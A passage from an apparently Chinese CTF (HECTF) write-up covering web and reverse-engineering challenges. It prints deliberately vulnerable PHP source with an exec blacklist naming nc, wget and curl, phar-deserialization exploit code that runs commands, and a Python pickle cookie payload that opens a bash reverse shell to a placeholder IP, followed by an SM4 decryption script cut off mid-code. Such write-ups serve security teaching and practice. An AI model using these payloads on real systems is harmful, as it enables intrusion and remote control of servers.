class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">&#x27;FROM_INDEX&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]) ? <span class="string">&#x27;home&#x27;</span> : <span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_string(<span class="variable">$show</span>) || preg_match(<span class="string">&#x27;/\.\./&#x27;</span>, <span class="variable">$show</span>) || preg_match(<span class="string">&#x27;/zip/i&#x27;</span>,<span class="variable">$show</span>))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Not this !!!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">ob_start(<span class="string">&#x27;ob_gzhandler&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">page_tshow</span>(<span class="params"><span class="variable">$show</span></span>) </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;header&quot;</span>&gt;</span><br><span class="line">&lt;center&gt;&lt;a href=<span class="string">&quot;?show=home&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">logo</span>&quot;&gt;&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">images</span>/<span class="title">logo</span>.<span class="title">jpg</span>&quot; <span class="title">alt</span>=&quot;&quot;&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">body</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">function</span> <span class="title">fatal</span>($<span class="title">msg</span>) </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span>&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">article</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h2</span>&gt;<span class="title">Error</span>&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">p</span>&gt;&lt;?=$<span class="title">msg</span>;?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">exit</span>(1);</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">page_tshow</span>($<span class="title">show</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">if</span>(!(<span class="title">include</span> $<span class="title">show</span> . &#x27;.<span class="title">php</span>&#x27;))</span></span><br><span class="line"><span class="class">    <span class="title">fatal</span>(&#x27;<span class="title">no</span> <span class="title">no</span> <span class="title">no</span>&#x27;);</span></span><br><span class="line"><span class="class"><span class="title">if</span>(<span class="title">isset</span>($<span class="title">file</span>))</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$file</span>))</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;surely exists&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span>   </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;dont exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>home.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;common.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">article</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;<span class="title">Welcome</span> <span class="title">to</span> <span class="title">HECTF</span> ！！！&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">Click</span> <span class="title">here</span> <span class="title">to</span> <span class="title">upload</span> <span class="title">your</span> <span class="title">file</span> =&gt; &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">show</span>=<span class="title">upload</span>&quot;&gt;传送门&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;common.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$fn</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$ft</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!is_uploaded_file(<span class="variable">$fn</span>)) &#123;</span><br><span class="line">        fatal(<span class="string">&#x27;uploaded file corrupted&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/png&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$ft</span>,<span class="variable">$array</span>))&#123;</span><br><span class="line">        fatal(<span class="string">&quot;No, I want png picture ᵕ᷄ι ̠ᵕ᷅&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$imagekey</span> = create_image_key();</span><br><span class="line"></span><br><span class="line">    move_uploaded_file(<span class="variable">$fn</span>, <span class="string">&quot;uploads/<span class="subst">$imagekey</span>.png&quot;</span>);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">&quot;Location: ?show=show&amp;imagekey=<span class="subst">$imagekey</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">article</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;<span class="title">Plz</span> <span class="title">Give</span> <span class="title">me</span> <span class="title">a</span> <span class="title">file</span> <span class="title">I</span> <span class="title">want</span>.&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot; <span class="title">action</span>=&quot;?<span class="title">show</span>=<span class="title">upload</span>&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">image</span>&quot;&gt;ᵕ᷄ι ̠ᵕ᷅    </span></span><br><span class="line"><span class="class"> &lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">id</span>=&quot;<span class="title">image</span>&quot; <span class="title">name</span>=&quot;<span class="title">image</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">br</span> /&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Upload</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure><p>common.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!defined(<span class="string">&#x27;FROM_INDEX&#x27;</span>)) <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;MAX_IM_SIZE&#x27;</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_image_key</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sha1(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] . <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>] . time() . mt_rand());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_image</span>(<span class="params"><span class="variable">$imagekey</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> !== preg_match(<span class="string">&#x27;/[0-9a-f]&#123;40&#125;/&#x27;</span>, <span class="variable">$imagekey</span>)) &#123;</span><br><span class="line">        fatal(<span class="string">&#x27;Invalid image key.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$im</span> = imagecreatefrompng(<span class="string">&quot;uploads/<span class="subst">&#123;$imagekey&#125;</span>.png&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$im</span>) &#123;</span><br><span class="line">        fatal(<span class="string">&#x27;Failed to load image.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$im</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hectf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hectf) &amp;&amp; !preg_match(<span class="string">&#x27;/[0-9]/&#x27;</span>,<span class="keyword">$this</span>-&gt;hectf) &amp;&amp; intval(<span class="keyword">$this</span>-&gt;hectf))</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;</span>, <span class="keyword">$this</span>-&gt;cmd))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;No no no no no!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        exec(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审计源码，图片上传点+<code>file_exists()</code>函数+自定义<code>HeCTF</code>类，判断为文件上传+phar反序列化利用。</p><p><code>HeCTF</code>类中RCE使用 <code>tee</code> 命令绕过过滤写文件。</p><p>构造phar文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hectf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> HeCTF();   </span><br><span class="line"><span class="variable">$o</span>-&gt;hectf = <span class="keyword">array</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd = <span class="string">&#x27;ls / | tee 1&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>将生成的phar文件改为png后缀上传，在index.php以POST方式传入file值，利用phar伪协议反序列化RCE：</p><p><code>POST: file=phar://uploads/25c3a34d93227241d5dacc8eb84a80ef2aabeab1.png</code></p><p>读到flag文件名 <code>/ffflllllaaaaggg</code>，同样操作构造读flag内容的phar文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hectf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> HeCTF();   </span><br><span class="line"><span class="variable">$o</span>-&gt;hectf = <span class="keyword">array</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd = <span class="string">&#x27;cat /ffflllllaaaaggg | tee 1&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="皮扣的商店"><a href="#皮扣的商店" class="headerlink" title="皮扣的商店"></a>皮扣的商店</h3><p>进入页面发现可以点击按钮，但是没钱可用，点击时发现cookie是变化的。</p><p>cookie像base64，解码，结合题目可知为json的pickle序列化结果，反推一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(b64decode(enc)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&#x27;money&#x27;: 500, &#x27;history&#x27;: [], &#x27;anti_tamper_hmac&#x27;: &#x27;aa1ba4de55048cf20e0a7a63b7f8eb62&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>可见使用了hmac哈希，无法爆破，但可以构造RCE代码序列化后放入cookie，点击按钮执行恶意代码，由于页面无结果回显，构造反弹shell代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;bash -c \&quot;bash -i &gt; /dev/tcp/[IP]/[Port] 0&gt;&amp;1 2&gt;&amp;1\&quot;&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><p>替换cookie后，点击按钮即可在vps getshell拿flag。</p><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="贝斯"><a href="#贝斯" class="headerlink" title="贝斯"></a>贝斯</h3><p>变表base32，Cyberchef一把梭得到flag。</p><p>​    </p><h3 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h3><blockquote><p>如何分析Apk呢</p></blockquote><p>用jadx打开apk，在AndroidManifest.xml里发现：</p><p><code>&lt;meta-data android:name=&quot;父拉哥&quot; android:value=&quot;付拉哥头&#123;Apktool_or_jadx&#125;&quot;/&gt;</code></p><p>flag：<code>HECTF&#123;Apktool_or_jadx&#125;</code></p><p>​    </p><h3 id="HelloIos"><a href="#HelloIos" class="headerlink" title="HelloIos"></a>HelloIos</h3><blockquote><p>简单的ios</p></blockquote><p>找到关键加密函数，简单异或还原flag。</p><p>​    </p><h3 id="ezre"><a href="#ezre" class="headerlink" title="ezre"></a>ezre</h3><blockquote><p>easy reverse</p></blockquote><p>加密逻辑很难看，利用IDA的findcrypt插件可以识别出存在SM4加密算法的关键参数数组。</p><p>利用动调找到SM4加密使用的128位key值，导出hex：<code>AD763B4FCDCFD9251089FB0408A45F80</code>，以及128bit密文，导出hex：<code>D75CDA22176DD392A1A570915F66A61C</code>。</p><p>找一个SM4算法的python脚本解密得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SM4Cipher</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(key) == <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;SM4 key must be length of 16. &quot;</span>)</span><br><span class="line">        self._key_r = self._generate_key(key)</span><br><span class="line">        self.block_size = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, plaintext: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._do(plaintext, self._key_r)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, ciphertext: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._do(ciphertext, self._key_r[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_do</span>(<span class="params">self, text: <span class="built_in">bytes</span>, key_r: <span class="built_in">list</span></span>):</span></span><br><span class="line">        text_ = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        <span class="comment"># 将 128bit 转化成 4x32bit</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            text_[i] = <span class="built_in">int</span>.from_bytes(text[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            box_in = text_[<span class="number">1</span>] ^ text_[<span class="number">2</span>] ^ text_[<span class="number">3</span>] ^ key_r[i]</span><br><span class="line">            box_out = self._s_box(box_in)</span><br><span class="line">            temp = text_[<span class="number">0</span>] ^ box_out ^ self._rot_left(box_out, <span class="number">2</span>) ^ self._rot_left(box_out, <span class="number">10</span>)</span><br><span class="line">            temp = temp ^ self._rot_left(box_out, <span class="number">18</span>) ^ self._rot_left(box_out, <span class="number">24</span>)</span><br><span class="line">            text_ = text_[<span class="number">1</span>:] + [temp]</span><br><span class="line">        text_ = text_[::-<span class="number">1</span>]  <span class="comment"># 结果逆序</span></span><br><span class="line">        <span class="comment"># 将 4x32bit 合并成 128bit</span></span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            result.extend(text_[i].to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_generate_key</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;密钥生成&quot;&quot;&quot;</span></span><br><span class="line">        key_r, key_temp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)], [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        FK = [<span class="number">0xa3b1bac6</span>, <span class="number">0x56aa3350</span>, <span class="number">0x677d9197</span>, <span class="number">0xb27022dc</span>]</span><br><span class="line">        CK = [<span class="number">0x00070e15</span>, <span class="number">0x1c232a31</span>, <span class="number">0x383f464d</span>, <span class="number">0x545b6269</span>, <span class="number">0x70777e85</span>, <span class="number">0x8c939aa1</span>, <span class="number">0xa8afb6bd</span>, <span class="number">0xc4cbd2d9</span>,</span><br><span class="line">              <span class="number">0xe0e7eef5</span>, <span class="number">0xfc030a11</span>, <span class="number">0x181f262d</span>, <span class="number">0x343b4249</span>, <span class="number">0x50575e65</span>, <span class="number">0x6c737a81</span>, <span class="number">0x888f969d</span>, <span 